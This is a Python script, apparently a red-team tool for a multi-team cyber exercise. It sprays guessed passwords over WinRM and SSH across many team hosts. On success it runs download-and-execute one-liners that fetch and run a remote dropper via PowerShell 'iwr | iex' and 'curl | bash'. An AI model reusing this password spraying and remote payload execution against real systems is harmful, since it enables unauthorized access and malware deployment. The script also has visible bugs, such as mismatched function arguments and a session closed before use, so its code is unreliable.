import winrm
import re
import paramiko

# Fixes PyWinRM ipv6 issue (Shoutout illidian80 on github)
_original_build_url = winrm.Session._build_url
@staticmethod
def _patched_build_url(target, transport):
    # IPv6 pattern matching
    ipv6_match = re.match(
        r'(?i)^((?P<scheme>http[s]?)://)?(\[(?P<ipv6>[0-9a-f:]+)\])(:(?P<port>\d+))?(?P<path>(/)?(wsman)?)?',
        target
    )
    if ipv6_match:
        scheme = ipv6_match.group('scheme') or ('https' if transport == 'ssl' else 'http')
        host = '[' + ipv6_match.group('ipv6') + ']'
        port = ipv6_match.group('port') or ('5986' if transport == 'ssl' else '5985')
        path = ipv6_match.group('path') or 'wsman'
        return '{0}://{1}:{2}/{3}'.format(scheme, host, port, path.lstrip('/'))
    return _original_build_url(target, transport)
winrm.Session._build_url = _patched_build_url

# Establish WinRM Session
def create_windows_session(host, username, password):
    try:
        # Wrap IPv6 addresses in brackets
        host_addr = f"[{host}]" if ':' in host and not host.startswith('[') else host
        session = winrm.Session(
            f'http://{host_addr}:5985/wsman',
            auth=(f"{username}", password),
            server_cert_validation='ignore',
            transport='ntlm'
        )
        return session
    except Exception as e:
        return None


def create_linux_session(host, username, password):
    session = paramiko.SSHClient()
    session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    session.connect(host, username=username, password=password, timeout=10)
    session.close()


def windows_execute(session):
    ps_script = 'iwr http://192.168.14.3/download/dropper.ps1 | iex'
    output = session.run_cmd(f'powershell -c "{ps_script}"')

def linux_execute(session):
    stdin, stdout, stderr = session.exec_command("curl http://192.168.14.3/download/dropper.sh | bash")
    

def main():
    for i in range(1, 18):
        domain = f"team{i:02d}.cosmic.war"
        
        windows_machines = [
            f"10.{i}.1.1",
            f"10.{i}.1.2",
            f"10.{i}.1.3",
            f"10.{i}.1.4",
            f"192.168.{i}.1",
            f"192.168.{i}.2"
        ]

        linux_machines = [
            f"10.{i}.1.5",
            f"10.{i}.1.6",
            f"10.{i}.1.7",
            f"10.{i}.1.8",
            f"192.168.{i}.3",
            f"192.168.{i}.4",
            f"192.168.{i}.5"
        ]

        windows_domain_admin = "admiral"

        windows_credentials = [
            "nosferatu",
            "letredin",
            "admiral",
            "captain",
            ""
        ]

        local_admin = "captain"

        linux_credentials = [
            "captain",
            "letredin",
            "nomnom",
            "father",
            ""
        ]

        for host in windows_machines:
            found_session = False
            for password in windows_credentials:
                if not found_session:
                    session = create_windows_session(host, f"{domain}\\{windows_domain_admin}", password)
                    if session is not None:
                        found_session = True
                        windows_execute(session, host)
                    else:
                        session = create_windows_session(host, local_admin, password)
                        if session is not None:
                            found_session = True
                            windows_execute(session, host)

        for host in linux_machines:
            for password in linux_credentials:
                try:
                    session = create_linux_session(host, local_admin, password)
                    linux_execute(session)
                except Exception:
                    continue

if __name__ == "__main__":
    main()